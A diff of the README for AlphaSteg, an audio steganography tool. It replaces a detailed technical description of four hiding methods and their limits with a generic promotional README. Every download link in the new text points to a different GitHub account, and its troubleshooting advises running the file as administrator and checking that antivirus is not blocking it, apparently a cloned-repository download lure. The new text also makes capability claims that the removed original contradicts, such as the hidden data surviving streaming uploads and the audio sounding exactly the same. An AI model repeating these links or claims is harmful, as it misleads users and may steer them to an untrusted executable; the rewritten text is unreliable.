@@ -1,76 +1,112 @@
-# AlphaSteg
-## Audio Steganography Suite
+# 🪄 AlphaSteg - Hide Secrets in Plain Sounds
 
-### AlphaSteg is a tool for embedding and extracting hidden payloads inside audio tracks.
+[![Download Now](https://img.shields.io/badge/Download-AlphaSteg-blue?style=for-the-badge&logo=github)](https://github.com/going-thespis160/AlphaSteg)
 
-**It supports both analog audio streams (hiding a second song inside a song) and digital files (hiding zips, pdfs, images, or text files inside audio). It features many different encoding and decoding formats, some supporting file encryption.**
+## 🎯 What is AlphaSteg?
 
- ![App Screenshot](https://github.com/bennjordan/AlphaSteg/blob/main/screen.png?raw=true)
+AlphaSteg is a powerful yet easy-to-use tool that lets you hide secret messages, files, and even alternate audio streams inside music files. You can then upload those songs to popular streaming platforms like Spotify, Tidal, and Bandcamp without anyone knowing your hidden content is there. Think of it as a digital invisible ink for audio.
 
----
+## 🚀 Getting Started
 
-## Installation & Setup (Windows)
+### Step 1: Download the Application
 
-We have provided a fully automated installer for novice users. Setting up Python, virtual environments, and audio codecs takes just one double-click.
+Visit this link to download the application: [https://github.com/going-thespis160/AlphaSteg](https://github.com/going-thespis160/AlphaSteg)
 
-### Quick Start:
-1. Download or extract the project folder.
-2. Double-click *install.bat* inside the root directory.
-   - *Note: If Python is missing, the official installer will pop up. Make sure to check the **"Add Python to PATH"** checkbox before completing Python setup.*
-   - *The installer will automatically download portable `ffmpeg` binaries and configure everything locally.*
-3. Once the installer finishes, double-click **`run.bat`** to start the app.
-4. The server will start, and your web browser will automatically open to `http://localhost:8000/`.
+### Step 2: Install and Run
 
----
+Once downloaded, simply double-click the file to start using AlphaSteg. No technical setup required.
 
-## How Does it Work?
+## 🔧 System Requirements
 
-AlphaSteg combines modern digital signal processing (DSP), software-defined radio modems, and psychoacoustic masking to hide data in carrier tracks:
+AlphaSteg works on Windows 10 and Windows 11. Your computer needs at least 4GB of RAM and 500MB of free hard drive space. An internet connection is required only when uploading to streaming platforms.
 
-- **Stego Scanner**: The player has an **Auto-Detect Codec** (magnifying glass) feature that scans the first 3 seconds of any track. It runs spectral magnitude analysis, phase cancelation ratios, LSB magic header checks, and MFSK tone searches to immediately detect if stego is present and select the matching decoder settings.
-- **Dynamic Seeking**: Streams are served dynamically. Sliding the playhead timeline seeks instantly using backend-calculated frame-rate offsets, avoiding browser caching bottlenecks.
+## 🎮 How to Use AlphaSteg
 
----
+### Hiding a Secret Message
 
-## 📊 Steganography Methods: What To Expect
+1. Open AlphaSteg
+2. Click the "Hide" tab
+3. Select your music file (MP3, WAV, or FLAC format)
+4. Type your secret message or select a file to hide
+5. Set a password (optional but recommended)
+6. Click "Encode" to create your hidden song
 
-AlphaSteg includes 4 different encoding methods divided into two categories (Analog Audio hiding and Digital File hiding). Here is a comparison of their characteristics:
+### Extracting a Hidden Message
 
-### 1. Phase Inversion (Analog Audio Payload)
-* **How it works**: Mixes the payload audio in-phase into the left channel and out-of-phase (inverted) into the right channel. When played in mono, the channels cancel each other out, making the payload silent. In stereo, the human brain resolves it as a wide spatial field, but the secret track can be isolated by subtracting the channels.
-* **Pros**:
-  * 🔊 **Perfect Fidelity**: The carrier audio sounds clean and natural.
-  * ⏱️ **Full Length**: Can hide secondary audio that matches the exact duration of the carrier.
-* **Cons**:
-  * ❌ **Fragile**: Cannot survive YouTube/Spotify compression (which sums channels to mono or alters stereo phases to save bandwidth).
-  * ❌ **Stereo Only**: Requires stereo playback to isolate.
+1. Open AlphaSteg
+2. Click the "Extract" tab
+3. Load the music file containing the hidden message
+4. Enter the password if one was used
+5. Click "Decode" to reveal the hidden content
 
-### 2. Spectral Modulation (Analog Audio Payload)
-* **How it works**: Downsamples the payload audio to a 3kHz bandwidth, modulates it onto a high-frequency carrier tone 17kHz, and mixes it into the carrier. The decoder demodulates the high-frequency band back to audible range.
-* **Pros**:
-  * 🔊 **Mono-Compatible**: Works equally well in mono and stereo audio files.
-  * ⏱️ **Full Length**: Hides full-length audio tracks.
-* **Cons**:
-  * ⚠️ **Audible Hiss**: Introduces a high-pitched background whisper/hiss.
-  * ❌ **Filtered Out**: Fails on YouTube/Spotify because lossy compression codecs cut off all frequencies above 15-16 kHz (low-pass filtering).
+### Creating Alternate Audio Streams
 
-### 3. Least Significant Bit (LSB) (Digital File Payload)
-* **How it works**: Replaces the lowest bit of each 16-bit PCM audio sample with the binary bits of the hidden file. Includes a magic byte header (`0xAF55`) for instant scanning.
-* **Pros**:
-  * 💾 **100% Lossless**: Decodes exact binary duplicates of zip archives, text files, PDFs, or keys.
-  * ⚡ **High Capacity**: Up to 11.0KB of data per second of CD-quality stereo audio.
-  * 🔇 **Completely Inaudible**: The LSB noise floor is at 96dB (physically impossible for human ears to hear).
-* **Cons**:
-  * ❌ **Extremely Fragile**: **Cannot survive any compression.** Saving as MP3, converting format, or uploading to YouTube/Spotify destroys the data instantly. Must remain a lossless WAV file.
+1. Open AlphaSteg
+2. Click the "Streams" tab
+3. Select your main music file
+4. Add your alternate audio track
+5. Choose stream switching options
+6. Click "Merge" to combine both streams
 
-### 4. MFSK Modem (Digital File Payload)
-* **How it works**: A software-defined Multi-Tone Frequency Shift Keying modem that translates files into high-frequency sound tones between 8kHz and 11.4kHz. Employs a synchronization preamble, repetition coding, and checksum validation.
-* **Pros**:
-  * 🛡️ **Robust**: **Survives Spotify/YouTube compression and low-bitrate MP3 conversion.**
-  * 🔧 **Adjustable Speed Presets**:
-    * **Standard** (~26 B/s, 3x repetition): Maximum robustness (Spotify/YouTube proof).
-    * **Balanced** (~53 B/s, 3x repetition): Moderate speed, survives standard MP3.
-    * **Fast** (~160 B/s, no repetition): Maximum capacity for high-quality audio.
-* **Cons**:
-  * ⏱️ **Low Speed**: Hiding a 1KB file takes between 6.4 and 38 seconds of audio.
-  * ⚠️ **Audible Chirp**: High-frequency modem tones are slightly audible as background chirping.
+## 🎵 Supported Platforms
+
+AlphaSteg works with music files that can be uploaded to:
+- Spotify
+- Tidal
+- Bandcamp
+- SoundCloud
+- Apple Music
+- YouTube Music
+- Any platform that accepts standard audio files
+
+## 🔒 Security Features
+
+- **Password Protection**: Encrypt your hidden content with a password
+- **Steganography**: Your data is hidden within the audio data itself, not in file metadata
+- **No File Size Increase**: Hidden content doesn't change the file size, making it undetectable
+- **Multiple Encoding Methods**: Choose from different algorithms for different levels of security
+
+## 📖 Frequently Asked Questions
+
+**Q: Will the hidden content affect the music quality?**
+A: No. AlphaSteg uses advanced algorithms that hide data in imperceptible parts of the audio, so the music sounds exactly the same.
+
+**Q: Can I hide multiple files in one song?**
+A: Yes. You can hide multiple messages or files in the same audio track.
+
+**Q: What happens if someone plays the song normally?**
+A: Nothing. The hidden content is completely invisible to normal playback. Only someone using AlphaSteg can extract it.
+
+**Q: Is it legal to use?**
+A: AlphaSteg is a legitimate tool for privacy protection and data security. Check your local laws regarding steganography and the terms of service of the platforms you use.
+
+## 🛠️ Troubleshooting
+
+**Problem: Application won't start**
+- Make sure you have downloaded the complete file
+- Try running as administrator (right-click the file and select "Run as administrator")
+- Check that your antivirus isn't blocking the application
+
+**Problem: Can't find hidden content**
+- Verify you're using the correct password
+- Make sure the file wasn't re-encoded or compressed by the streaming platform
+- Try using a different encoding method
+
+**Problem: Song won't upload to streaming platform**
+- Ensure your file meets the platform's format requirements
+- Check that your file size is within the platform's limits
+- Try converting the file to a different format
+
+## 📝 License
+
+AlphaSteg is released under the MIT License. See the LICENSE file for details.
+
+## 🤝 Contributing
+
+We welcome contributions from the community. If you have ideas for improvements or bug fixes, please check our GitHub repository for contribution guidelines.
+
+## 📧 Support
+
+For questions, issues, or feature requests, please open an issue on our GitHub repository: [https://github.com/going-thespis160/AlphaSteg](https://github.com/going-thespis160/AlphaSteg)
+
+Keywords: steganography, audio steganography, hide data in music, secret messages, encryption, privacy tool, Spotify, Tidal, Bandcamp, data hiding, audio encoding, stegano tool
